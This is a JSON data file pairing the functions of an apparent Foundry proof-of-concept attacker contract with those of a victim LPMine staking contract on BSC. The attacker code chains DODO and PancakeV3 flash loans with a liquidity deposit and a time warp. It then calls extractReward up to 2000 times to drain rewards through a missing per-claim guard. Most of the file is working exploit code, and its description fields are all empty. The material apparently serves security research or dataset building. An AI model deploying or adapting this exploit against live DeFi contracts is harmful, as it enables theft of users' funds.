[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        dodoCall(sender, baseAmount, quoteAmount, data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DVMFlashLoanCall",
    "original_code": "    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        dodoCall(sender, baseAmount, quoteAmount, data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "dodoCall",
    "original_code": "    function dodoCall(address a, uint256 b, uint256 c, bytes memory d) public {\n        console.log(\"USDT borrow\",USDT.balanceOf(address(this)));\n        swap_token_to_token(address(USDT), address(ZF), 1000 ether / 2);\n        ZF.approve(address(LPMine), ZF.balanceOf(address(this)));\n        USDT.approve(address(LPMine), USDT.balanceOf(address(this)));\n        LPMine.partakeAddLp(2,ZF.balanceOf(address(this)),500 ether,0x114FAA79157c6Ba61818CE2A383841e56B20250B);\n        cheats.warp(block.timestamp + 2 hours);\n        (bool success,) = v3pool.call(abi.encodeWithSignature(\"flash(address,uint256,uint256,bytes)\", address(this), borrow_2, 0, \"\"));\n        require(success, \"flash failed\");\n        USDT.transfer(dvm1,borrow_1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        USDT.transfer(address(pair), USDT.balanceOf(address(this)));\n        for(uint i = 0; i < 2000; i++) {\n            try LPMine.extractReward(1) {\n                // console.log(i,ZF.balanceOf(address(this)));\n            } catch {\n                continue;\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 45583892);\n        // attacker buy sor\n        deal(address(this),0);\n        deal(address(USDT),address(this),0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] USDT balance before\", USDT.balanceOf(address(this)), 18);\n        \n\n        (bool success,) = dvm1.call(abi.encodeWithSignature(\"flashLoan(uint256,uint256,address,bytes)\", 0, borrow_1, address(this), \"1\"));\n        require(success, \"flashloan failed\");\n\n        emit log_named_decimal_uint(\"[End] USDT balance after\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILPMine",
    "source_type": "victim_contract",
    "function_name": "extractReward",
    "original_code": "        function extractReward(uint256 _tokenId) external {\n            Token memory _token = tokens[_tokenId];\n            (uint256 _wtoAmount,uint256 _coarAmount) = getCanClaimed(_msgSender());\n            PledgeInfo storage _pledge = userPledge[_msgSender()];\n            uint256 _canReward;\n            if(_tokenId == wtoTokenId){\n                _canReward = _wtoAmount;\n                _pledge.wtoRewardTime = block.timestamp;\n            }\n            if(_tokenId == coarTokenId){\n                _canReward = _coarAmount;\n                _pledge.coarRewardTime = block.timestamp;\n            }\n            rewardPool.claimToken(_token.tokenAddress,_canReward,_msgSender());           \n            rewardParent(_tokenId,_token.tokenAddress,_canReward,_msgSender());\n            emit ReceiveRewird(_msgSender(),_token.tokenAddress,_canReward,block.timestamp);\n        }\n\n        \n",
    "description": ""
  },
  {
    "contract/interface": "ILPMine",
    "source_type": "victim_contract",
    "function_name": "partakeAddLp",
    "original_code": "        function partakeAddLp(uint256 _tokenId,uint256 _tokenAmount, uint256 _usdtAmount,address _oldUser) public {    \n            if(mustBind) {\n                require(isBind(_oldUser),\"oldUser not bind parent\");\n            }\n            if(!isBind(_msgSender())) {\n                newBind(_msgSender(),_oldUser);\n            }\n            IERC20 _usdt = IERC20(usdtAddress);\n            _usdt.transferFrom(_msgSender(),address(this),_usdtAmount);\n            Token memory _token = tokens[_tokenId];\n            address _tokenAddress = _token.tokenAddress;\n            IERC20 _tokenContract = IERC20(_token.tokenAddress);\n            _tokenContract.transferFrom(_msgSender(),address(this),_tokenAmount);\n            \n            (uint256 _addTokenAmount,uint256 _addUsdtAmount,uint256 _liquidity) = addLiquidityUseUsdt(_tokenAddress,usdtAddress,_tokenAmount,_usdtAmount);\n            \n            backToken(_tokenAddress,_tokenAmount,_addTokenAmount);\n            \n            backToken(usdtAddress,_usdtAmount,_addUsdtAmount);\n            \n            (uint256 _wtoAmount,uint256 _coarAmount) = getCanClaimed(_msgSender());\n            if(_wtoAmount > 0){\n                rewardPool.claimToken(tokens[wtoTokenId].tokenAddress,_wtoAmount,_msgSender());\n                rewardParent(wtoTokenId,tokens[wtoTokenId].tokenAddress,_wtoAmount,_msgSender());\n            }\n            if(_coarAmount > 0){\n                rewardPool.claimToken(tokens[coarTokenId].tokenAddress,_coarAmount,_msgSender());\n                rewardParent(coarTokenId,tokens[coarTokenId].tokenAddress,_coarAmount,_msgSender());\n            }\n            \n            PledgeInfo storage _pledge = userPledge[_msgSender()];\n            if(_tokenId == wtoTokenId){\n                _pledge.wtoLpAmount += _liquidity;   \n                _pledge.wtoLpBackTime = wtoOpenBuy;\n                _pledge.wtoRewardTime = block.timestamp;\n            }\n            if(_tokenId == coarTokenId){\n                _pledge.coarLpAmount += _liquidity;\n                _pledge.coarRewardTime = block.timestamp;\n            }\n            _pledge.depositTime = block.timestamp;\n\n            emit AddLP(_msgSender(), _tokenAddress, _liquidity, block.timestamp);\n        }\n\n",
    "description": ""
  }
]